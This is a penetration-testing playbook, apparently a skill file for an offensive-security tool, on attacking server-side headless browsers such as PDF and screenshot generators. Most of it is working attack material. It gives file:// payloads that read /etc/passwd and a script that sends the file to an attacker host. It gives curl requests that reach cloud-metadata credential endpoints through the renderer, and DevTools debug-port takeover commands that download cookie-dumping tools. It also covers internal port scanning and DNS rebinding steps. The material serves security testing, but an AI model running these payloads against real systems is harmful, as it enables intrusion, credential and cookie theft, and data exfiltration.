---
name: attack-headless-browser
description: "Server-side headless browser exploitation — local file read via insecure flags, PDF/screenshot generator SSRF, remote debugging port takeover, DNS rebinding"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - headless-browser
  - puppeteer
  - chrome
  - ssrf
  - lfi
  - devtools
  - attack
tech_stack:
  - node
  - puppeteer
  - chromium
  - electron
cwe_ids:
  - CWE-918
  - CWE-200
  - CWE-79
chains_with:
  - attack-ssrf
  - wstg-inpv-01
prerequisites: []
severity_boost:
  attack-ssrf: "SSRF pivot into the headless browser's internal network reach compounds with cloud metadata/internal service access"
  wstg-inpv-01: "Stored/reflected XSS reaching an internal admin bot rendered by a headless browser upgrades to server-side file read or SSRF"
---

# Headless Browser Exploitation (PDF/Screenshot Generators, Admin Bots)

## Objective

Abuse server-side headless browser instances (PDF export, screenshot/thumbnail generators, HTML-to-image, internal "admin bot" XSS reviewers) to read local files, pivot into the internal network via SSRF, or hijack the browser's remote debugging protocol for full control.

## Testing Methodology

### Phase 1: Fingerprint the Rendering Backend

```bash
# Look for endpoints that convert user-supplied HTML/URL into PDF/PNG
curl -s -X POST "https://TARGET/api/export/pdf" -d "url=https://example.com" -o out.pdf
file out.pdf   # PDF magic bytes confirm a real rendering engine (often headless Chrome)

# Check response headers / error pages for engine fingerprint
curl -s -I "https://TARGET/api/export/pdf" | grep -i "x-powered-by\|server"
```

### Phase 2: Local File Read via Injected HTML

Inject a JS-redirect or iframe into any HTML the backend will render, then export it.

```html
<!-- payload.html: JS redirect variant -->
<html><body>
<script>window.location = "file:///etc/passwd"</script>
</body></html>

<!-- payload.html: iframe variant -->
<html><body>
<iframe src="file:///etc/passwd" height="2000" width="2000"></iframe>
</body></html>
```

```js
// If the backend runs the browser with --allow-file-access[-from-files] and
// executes attacker-supplied JS (XSS -> rendered by admin bot / PDF engine):
<script>
  async function getFlag(){
    let response = await fetch("file:///etc/passwd");
    let flag = await response.text();
    fetch("https://ATTACKER_IP:8888/exfil", { method: "POST", body: flag });
  }
  getFlag();
</script>
```

```bash
# Submit payload.html as the "URL to export" / uploaded HTML and retrieve the PDF/PNG
curl -s -X POST "https://TARGET/api/export/pdf" \
  --data-urlencode "html=$(cat payload.html)" -o leak.pdf
# Inspect leak.pdf / leak.png for /etc/passwd content rendered as text/image
```

### Phase 3: SSRF via Rendering Target

```bash
# The renderer fetches attacker-controlled URLs server-side — full SSRF surface
curl -s -X POST "https://TARGET/api/export/pdf" \
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" -o meta.pdf

curl -s -X POST "https://TARGET/api/export/pdf" \
  -d "url=http://ATTACKER_IP:8888/ssrf-callback" -o cb.pdf
# See attack-ssrf for full internal pivot / cloud metadata / port scan methodology
```

### Phase 4: Remote Debugging Port (DevTools Protocol) Takeover

```bash
# Default port 9222 (or --remote-debugging-port=XXXX); confirm it's reachable
curl -s "http://TARGET:9222/json/version"
# {"Browser":"Chrome/136...","webSocketDebuggerUrl":"ws://TARGET:9222/devtools/browser/<uuid>"}

curl -s "http://TARGET:9222/json/list"   # list open tabs / targets

# Interact with the browser: dump cookies, extensions, open tabs
git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git
python3 WhiteChocolateMacademiaNut.py --ip TARGET --port 9222 --cookies

# Chrome >= Dec 2022 requires an explicit origin allow; if blocked, use the
# empty-Origin websocket fixup variant
curl -s https://gist.githubusercontent.com/slyd0g/955e7dde432252958e4ecd947b8a7106/raw/ripWCMN.py -o ripWCMN.py
python3 ripWCMN.py --target TARGET:9222

# Open a new tab pointed at attacker infra (also usable for port scanning, see Phase 5)
curl -s "http://TARGET:9222/json/new?http://ATTACKER_IP:8888/callback"

# Node.js inspector behaves the same way
curl -s "http://TARGET:9229/json/list"
```

### Phase 5: Internal Port Scan via Debug Protocol / Timing

```bash
# Loop the /json/new primitive across common internal ports, correlate
# callback hits on your listener to confirm open ports
for port in 22 80 443 3306 5432 6379 8080 9200 27017; do
  curl -s "http://TARGET:9222/json/new?http://127.0.0.1:$port/" >/dev/null &
done
wait

# Browser-side timing scan (when only XSS->admin-bot access, no debug port):
# inject <img src="http://127.0.0.1:PORT/"> and measure time-to-onerror;
# closed ports error fast, open-but-non-HTTP ports hang/timeout differently.
```

### Phase 6: DNS Rebinding (Bypass SSRF Allow-Lists)

```text
1. Stand up a DNS server answering AAAA with a real internet IP and A with
   an internal IP (e.g. 127.0.0.1) for the same rebind domain.
2. Chrome connects to the IPv6 (attacker) address first.
3. Close the IPv6 listener immediately after the first response.
4. Serve an iframe pointed at the rebind domain from the top window.
5. Chrome falls back to the IPv4 (internal) address on reconnect.
6. From the top window, script-inject into the now-internal iframe to
   exfiltrate its content (bypasses one-shot SSRF URL validation).

Tooling: https://github.com/nccgroup/singularity
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Local file read (`/etc/passwd`, source code, credentials) via renderer | Critical (P1) |
| Remote debugging port (9222/9229) exposed without auth | Critical (P1) |
| SSRF to cloud metadata endpoint via PDF/screenshot URL param | Critical (P1) |
| SSRF to internal network / arbitrary port scan via renderer | High (P2) |
| DNS rebinding bypasses an SSRF allow-list check | High (P2) |
| Headless browser process runs with `--no-sandbox` (renderer RCE amplifier) | High (P2) |
| Cookie/session/extension data dumped via DevTools Protocol | Critical (P1) |

## Evidence Requirements

- Exported PDF/PNG file showing rendered local file content or metadata response
- Full HTTP request that triggered the render (URL/HTML parameter used)
- `/json/version` and `/json/list` output confirming exposed debug port
- Captured OOB callback for blind SSRF cases
- Process command line (if obtainable) showing insecure flags (`--allow-file-access`, `--no-sandbox`, `--remote-debugging-port` without `--user-data-dir` isolation)

## Tools

- `WhiteChocolateMacademiaNut` — https://github.com/slyd0g/WhiteChocolateMacademiaNut — DevTools Protocol cookie/tab/extension dumper
- `ripWCMN.py` — websocket-origin-fixup variant for post-Dec-2022 Chrome
- `singularity` — https://github.com/nccgroup/singularity — DNS rebinding framework
- `curl` / `chrome://inspect` / `opera://inspect` — manual debug port interaction
- `attack_script ssrf_listener` — OOB callback capture (see attack-ssrf)

## References

- [Browser based Port Scanning with JavaScript - Nikolai Tschacher](https://web.archive.org/web/20210119151816/https://incolumitas.com/2021/01/10/browser-based-port-scanning/)
- [Changes to remote debugging switches to improve security - Chrome Team](https://web.archive.org/web/20250328233439/https://developer.chrome.com/blog/remote-debugging-port)
- [Cookies with Chromium's Remote Debugger Port - Justin Bui](https://web.archive.org/web/20201217170910/https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [Post-Exploitation: Abusing Chrome's debugging feature - wunderwuzzi](https://web.archive.org/web/20260215064320/https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [Tricks for Reliable Split-Second DNS Rebinding in Chrome and Safari - Daniel Thatcher](https://web.archive.org/web/20231206141057/https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari)
